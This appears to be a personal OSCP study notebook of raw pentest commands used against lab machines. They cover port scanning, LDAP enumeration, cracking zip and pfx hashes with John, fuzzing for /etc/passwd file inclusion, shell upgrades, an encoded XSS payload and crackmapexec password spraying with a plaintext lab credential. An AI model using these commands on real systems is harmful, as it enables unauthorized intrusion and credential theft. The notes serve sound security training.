### 26082023Sat

[OSCP - How to Take Effective Notes](https://youtu.be/yYmDQY1zKKE?list=PLDrNMcTNhhYqZU1ySROli7Oc08mxe1tZR)

https://www.youtube.com/@c0nd4

```
nmap -p- -sC -sV -oA tcp_all_ports 192.168.1.73
```

```
searchsploit moinmoin
```

![[Pasted image 20230826195512.png]]

```
python3 -m http.server 80
```

```
bash LinEnum.sh
```

### 27082023Sun

```
shutdown /r /t 0
```

```
shutdown -r -t 0
```

```
nmap -p389 192.168.237.103 --script=ldap-search
```
![[Pasted image 20230827215712.png]]

```
ldapsearch -x -b "dc=cybex,dc=nz" -H ldap://192.168.237.103
```

```
ldapsearch -x -b "dc=ldap.forumsys,dc=com" -H ldap://192.168.237.103
```

```
nmap -p 389 192.168.237.103 --script=ldap-search --script-args="ldap.username-creatigon"
```

```
nmap -p- -sC -sV -Pn 10.129.227.113
```

```
zip2john winrm_backup.zip > zipHash.john
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt zipHash.john
```

```
pfx2john legacyy_dev_auth.pfx > pfxHash.john
```

```
wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
```

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

```
scp nmap username@ip:/tmp
```

```
man ascii
```

```
scii(7)                                                                                           Miscellaneous Information Manual                                                                                          ascii(7)

NAME
       ascii - ASCII character set encoded in octal, decimal, and hexadecimal

DESCRIPTION
       ASCII is the American Standard Code for Information Interchange.  It is a 7‐bit code.  Many 8‐bit codes (e.g., ISO 8859‐1) contain ASCII as their lower half.  The international counterpart of ASCII is known as ISO 646‐IRV.

       The following table contains the 128 ASCII characters.

       C program '\X' escapes are noted.

       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char
       ────────────────────────────────────────────────────────────────────────
       000   0     00    NUL '\0' (null character)   100   64    40    @
       001   1     01    SOH (start of heading)      101   65    41    A
       002   2     02    STX (start of text)         102   66    42    B
       003   3     03    ETX (end of text)           103   67    43    C
       004   4     04    EOT (end of transmission)   104   68    44    D
       005   5     05    ENQ (enquiry)               105   69    45    E
       006   6     06    ACK (acknowledge)           106   70    46    F
       007   7     07    BEL '\a' (bell)             107   71    47    G
       010   8     08    BS  '\b' (backspace)        110   72    48    H
       011   9     09    HT  '\t' (horizontal tab)   111   73    49    I
       012   10    0A    LF  '\n' (new line)         112   74    4A    J
       013   11    0B    VT  '\v' (vertical tab)     113   75    4B    K
       014   12    0C    FF  '\f' (form feed)        114   76    4C    L
       015   13    0D    CR  '\r' (carriage ret)     115   77    4D    M
       016   14    0E    SO  (shift out)             116   78    4E    N
       017   15    0F    SI  (shift in)              117   79    4F    O
       020   16    10    DLE (data link escape)      120   80    50    P
       021   17    11    DC1 (device control 1)      121   81    51    Q
       022   18    12    DC2 (device control 2)      122   82    52    R
       023   19    13    DC3 (device control 3)      123   83    53    S
       024   20    14    DC4 (device control 4)      124   84    54    T
       025   21    15    NAK (negative ack.)         125   85    55    U
       026   22    16    SYN (synchronous idle)      126   86    56    V
       027   23    17    ETB (end of trans. blk)     127   87    57    W
       030   24    18    CAN (cancel)                130   88    58    X
       031   25    19    EM  (end of medium)         131   89    59    Y
       032   26    1A    SUB (substitute)            132   90    5A    Z
       033   27    1B    ESC (escape)                133   91    5B    [
       034   28    1C    FS  (file separator)        134   92    5C    \  '\\'
       035   29    1D    GS  (group separator)       135   93    5D    ]
       036   30    1E    RS  (record separator)      136   94    5E    ^
       037   31    1F    US  (unit separator)        137   95    5F    _
       040   32    20    SPACE                       140   96    60    `
 Manual page ascii(7) line 1 (press h for help or q to quit)
```

```
String.fromCharCode(97,108,101,114,116,40,49,41)
```

```
user1:password1
user2:password2
user3:password3
user4:password4
user5:password5
```

```
cat credentials.txt | cut -d ':' -f 1 > usernames.txt
```

```
cat credentials.txt | cut -d ':' -f 2 > passwords.txt
```

![](Pasted%20image%2020231024125817.png)

```
crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt -d 
--continue-on-success
```

```
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u
john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```
